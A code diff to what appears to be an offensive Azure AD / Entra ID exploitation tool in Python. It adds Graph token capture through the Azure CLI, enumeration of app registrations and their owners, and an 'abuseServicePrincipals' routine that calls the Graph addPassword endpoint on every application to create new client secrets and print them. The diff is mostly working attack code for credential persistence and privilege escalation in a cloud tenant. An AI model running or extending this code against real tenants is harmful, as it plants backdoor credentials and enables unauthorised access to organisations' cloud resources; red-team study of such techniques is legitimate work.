@@ -8,6 +8,7 @@ from prettytable import PrettyTable
 import subprocess
 
 Token = None
+accessTokenGraph = None
 TotalTargets = []
 TargetSubscription = None
 TargetTenantId = None
@@ -139,47 +140,77 @@ def GA_AssignSubscriptionOwnerRole(subscriptionId):
     else:
         return "Exploit Completed! You're Subscription Owner on SubscriptionId=" + str(subscriptionId)
 
-'''
-This API help to privileged account to reset user's Azure AD password
-@required_privilege: Global/Password/Helpdesk/Authentication/User Administrator and Privileged Authentication Administrator
-@success: No output from API
-'''
-def Utility_ResetUserPassword(subscriptionId):
-    global Token
-    print(parseUPN())
+
+def RD_AddAppSecret():
+    global accessTokenGraph
     headers = {
         'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
+        'Authorization': 'Bearer ' + accessTokenGraph
     }
-    r = requests.post(
-        "https://graph.microsoft.com/v1.0/users/"+str(parseUPNObjectId())+"/authentication/passwordMethods/28c10230-6103-485e-b985-444c60001490/resetPassword",
-        json={
-              "properties": {
-                "roleDefinitionId": "/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
-                "principalId":
-              }
-            },
+    r = requests.get(
+        "https://graph.microsoft.com/v1.0/applications",
         headers=headers)
     result = r.json()
-    if result['error']:
-        return "Exploit Failed. Abort."
+    return result
+def CHK_AppRegOwner(appId):
+    global accessTokenGraph
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + accessTokenGraph
+    }
+    r = requests.get("https://graph.microsoft.com/v1.0/applications?$filter=appId eq '" + appId + "'",
+                     headers=headers)
+    appData = r.json()['value'][0]['id']
+    AppOwners = requests.get("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/owners",headers=headers)
+    if str(parseUPN()) in AppOwners.text:
+        return "Yes! Try Exploit: Reader/abuseServicePrincipals"
     else:
-        return "Exploit Completed! You're Subscription Owner on SubscriptionId=" + str(subscriptionId)
+        return "N/A"
+
+def RD_addPasswordForEntrepriseApp(appId):
+    global accessTokenGraph
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + accessTokenGraph
+    }
+    r = requests.get("https://graph.microsoft.com/v1.0/applications?$filter=appId eq '" + appId + "'",
+                     headers=headers)
+    appData = r.json()['value'][0]['id']
+    addSecretPwd = requests.post(
+        "https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/addPassword",
+        json={
+            "passwordCredential": {
+                "displayName": "Password"
+            }
+        },
+        headers=headers)
+    print(addSecretPwd.json())
+    if addSecretPwd.status_code == 200:
+        pwdOwn = addSecretPwd.json()
+        return "AppId: " + pwdOwn['keyId'] + "| Pwd: " + pwdOwn['secretText']
+    else:
+        return "N/A"
 
 def tryGetToken():
+    global accessTokenGraph
     try:
         accessToken = None
-        res = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://management.azure.com/\""], capture_output=True, text=True)
-        if 'No subscription found' in res.stderr:
+        add = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://management.azure.com/\""], capture_output=True, text=True)
+        graph = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://graph.microsoft.com/\""], capture_output=True, text=True)
+        if 'No subscription found' in add.stderr or graph.stderr:
             print("No subscriptions were found. You will need to switch to tenant-level access manually: az login --allow-no-subscriptions")
             print("Failed generate token. You may need to login or try manually.")
-        elif 'Exception' in res.stderr:
+        elif 'Exception' in add.stderr or graph.stderr:
             print("Unable to use azure cli for generating token")
+            print("Failed generate token. You may need to login or try manually.")
+        elif add.stdout == "" or graph.stdout == "":
             print("Failed generate token. You may need to login or try manually.")
         else:
             print("Captured token done. All set!")
-            jres = json.loads(res.stdout)
+            jres = json.loads(add.stdout)
+            jresgraph = json.loads(graph.stdout)
             accessToken = jres['accessToken']
+            accessTokenGraph = jresgraph['accessToken']
         return accessToken
     except:
         return None
@@ -520,6 +551,33 @@ def attackWindow():
             else:
                 exit
                 statupWindow(True)
+        elif "Reader/ListServicePrincipal" in ExploitChoosen and mode == "run":
+            print("Trying to enumerate all service principles (App registrations)..")
+            EntAppsRecords = PrettyTable()
+            EntAppsRecords.align = "l"
+            EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "Has Ownership?"]
+            EntAppsRecordsCount = 0
+            for EntAppsRecord in RD_AddAppSecret()['value']:
+                print(CHK_AppRegOwner(EntAppsRecord['appId']))
+                EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], CHK_AppRegOwner(EntAppsRecord['appId'])])
+                EntAppsRecordsCount += 1
+            print(EntAppsRecords)
+        elif "Reader/abuseServicePrincipals" in ExploitChoosen and mode == "run":
+            print("Trying to enumerate all Enterprise applications (service principals)..")
+            EntAppsRecords = PrettyTable()
+            EntAppsRecords.align = "l"
+            EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "RoleAssignments","Can Abused?"]
+            EntAppsRecordsCount = 0
+            for EntAppsRecord in RD_AddAppSecret()['value']:
+                print("Trying to register service principle for " + EntAppsRecord['displayName'] + " app..")
+                pwdGen = RD_addPasswordForEntrepriseApp(EntAppsRecord['appId'])
+                if pwdGen == "N/A":
+                    EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], "N/A"])
+                else:
+                    EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'],
+                                            EntAppsRecord['publisherDomain'],pwdGen])
+                EntAppsRecordsCount += 1
+            print(EntAppsRecords)
         elif "GlobalAdministrator/elevateAccess" in ExploitChoosen and mode == "run":
             print("Elevating access to the root management group..")
             print(GA_ElevateAccess())
